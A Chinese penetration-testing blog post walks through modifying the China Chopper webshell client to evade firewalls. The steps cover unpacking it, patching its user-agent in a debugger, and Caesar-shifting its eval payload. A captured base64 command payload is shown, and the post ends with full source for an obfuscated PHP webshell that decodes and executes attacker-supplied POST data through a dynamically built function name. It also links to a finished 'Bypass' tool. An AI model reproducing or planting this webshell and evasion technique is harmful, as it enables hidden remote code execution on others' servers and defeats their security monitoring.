# BypassCaiDao

---
title: 打造一款专属的Bypass菜刀
date: 2018-03-01 06:16:23
tags: [Bypass菜刀,修改菜刀]
categories:
- 渗透测试
- Bypass系列
- Bypass菜刀
---

这个方法曾在17年1月1日发表在T00LS(原帖地址：https://www.t00ls.net/thread-37535-1-1.html)，从未公开发表在博客，今天把方法发布出来，愿对各位道友有用，从而做出更好的Bypass菜刀

<!--more-->

# 准备工作

## 一把菜刀

20100928发布的老版菜刀

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520635301.7899988.png)

## 查壳及脱壳

**查壳**

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520635126.9899032.png)

可以看到，菜刀使用了UPX压缩壳. UPX壳主要是压缩作用，很容易脱壳.

**脱壳**

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520635368.7694461.png)

直接把软件拖进去即可脱壳。

# 免杀原理

分析菜刀在连接webshell的时候发送的数据包情况，用WSExplorer或者Wireshark来抓包。

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520635498.3892045.png)

我们可以看出，菜刀连接webshell的时候发送的数据内容是：

```php
x=@eval(base64_decode($_POST[z0]));&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7ZWNobyAkRC4iXHQiO2lmKHN1YnN0cigkRCwwLDEpIT0iLyIpe2ZvcmVhY2gocmFuZ2UoIkEiLCJaIikgYXMgJEwpaWYoaXNfZGlyKCRMLiI6IikpZWNobygkTC4iOiIpO307ZWNobygifDwtIik7ZGllKCk7
```

菜刀在连接Webshell的时候会发送两段数据,分别是x 和 z0 

* x 是shell的密码，其中的数据是让shell再接收一个z0

* z0 中存放着执行命令，列目录，修改文件等操作的PHP代码,并试用base64加密数据.

经过测试发现，防火墙的拦截点有以下两点：

* 1.UA头，防火墙捕捉了一些恶意软件的UA头，一点发现UA头在列表中，则判断为恶意行为.

* 2.第一个参数x中的数据,赤裸裸的eval,哪个防火墙看见了也会拦截.

所以要做免杀就要做以下两点处理：

* 1.修改UA头，改成百度蜘蛛的UA 或者 正常浏览器的UA均可

* 2.将第一个参数中的数据也进行假面处理

# 实现免杀

## 修改UA头

由于改后的UA比原本的UA长，因此我们需要在程序领空的其他空白地方进行修改，免得覆盖程序代码.

正常的Chrome UA如下：

    Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36

用C32asm修改后：

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520636836.3815837.png)

OK，先记下这个地址000006E0

C32里面显示的是文件偏移地址，而OD显示的是内存偏移地址,那么需要在OD中找到文件偏移地址对应的内存偏移地址，然后将原来UA的地址换成新UA的地址

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520640096.5132568.png)

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520640157.3005311.png)

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520640189.9141579.png)

然后记录下这个内存偏移地址为：004006E0

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520640340.4536626.png)

找到将UA压栈的地方，修改地址为新的UA地址

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520640432.8110437.png)

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520642064.3123608.png)

然后右击 "复制到可执行文件" -> 右击"保存文件"

再抓包测试：

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520642552.2321646.png)

看到UA已经修改了

## 修改第一个参数数据

把@eval(base64_decode($_POST[z0])); 这段代码来进行自定义加密，然后再在shell中解密，这样也可以防止菜刀有后门。

我的自定义加密采用了凯撒密码：按照ascii表向后移动四位(尽量避开特殊字符，否则会失败),加密后的数据是 Dizep,fewi:8chigshi,(cTSWX_~4a--? 而杀软并不识别这段密文，因此达到免杀效果。

先在C32asm中搜索字符串

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520642620.2078102.png)

然后把里面的 @eval(base64_decode($_POST[z0])); 用 Dizep,fewi:8chigshi,(cTSWX_~4a--? 进行替换。

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520642834.6626763.png)

然后保存文件就大功告成了。

# 用法

在已经做过免杀的shell中添加以下代码：

```php
function aaa($arr){
    $arr = stripcslashes($arr);
    for($i=0;$i<strlen($arr);$i++){
		$arr[$i]=chr(ord($arr[$i])-4);
    }
    return $arr;
}
aaa($_POST['x']);  // 解密传输数据
```

示例：

```php
<?php
function aaa($arr){
    $arr = stripcslashes($arr);
    for($i=0;$i<strlen($arr);$i++){
		$arr[$i]=chr(ord($arr[$i])-4);
    }
    return $arr;
}

$a=md5('ssss');
echo $a.'';
$b=substr($a,2,2)+37;
$s=$b+18;
$e=substr($a,-7,1);
$r=$s-1;
$t=$r+2;
$z=chr($b).chr($s).chr($s).$e.chr($r).chr($t);
$arr = aaa($_POST['x']);
$z($arr);
?>
```

![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520643284.9058053.png)

# 成品地址

[Bypass菜刀](https://github.com/admintony/BypassCaiDao)
